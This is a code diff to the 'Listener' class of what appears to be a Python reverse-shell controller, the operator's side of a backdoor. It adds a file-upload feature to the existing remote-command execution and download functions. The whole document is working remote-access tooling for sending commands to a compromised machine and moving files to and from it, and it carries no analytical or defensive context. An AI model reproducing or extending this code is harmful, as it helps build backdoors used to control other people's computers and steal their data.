@@ -28,18 +28,35 @@ class Listener:
                 return json.loads(json_data)
             except ValueError:
                 continue
-
+    #upload_file
+    def read_file(self, path):
+        with open(path,"rb") as file:
+            return path, b64.b64encode(file.read())
+    #download_file
     def write_file(self, path, content):
         with open(path,'wb') as file:
             file.write(b64.b64decode(content))
             return "[+] Download successful. . ."
 
     def execute_remotely(self, command):
-        self.send_json(command)
+        # self.send_json(command)
+
+        #exit program
         if(command[0].lower() == "exit"):
+            self.send_json(command)
             self.connection.close()
             print("[+] Exiting shell. . .")
             exit()
+
+        #upload file
+        elif(command[0].lower() == "upload"):
+            fileName, upload_file = self.read_file(command[1])
+            upload = [fileName, upload_file]
+            self.send_json(upload)
+
+        else:
+            self.send_json(command)
+
         return self.receive_json()
 
     def run(self):
